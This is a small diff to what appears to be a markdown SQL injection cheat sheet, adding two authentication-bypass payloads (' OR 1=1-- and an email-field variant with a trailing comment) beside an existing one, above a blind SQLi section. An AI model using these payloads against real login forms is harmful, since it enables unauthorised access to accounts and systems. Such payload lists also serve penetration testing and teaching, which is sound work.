@@ -24,6 +24,8 @@
 ```sql
 -- Authentication bypass
 ' OR 1=1;--
+' OR 1=1--
+username@or.email'--
 ```
 
 ## Blind SQLi - Boolean based
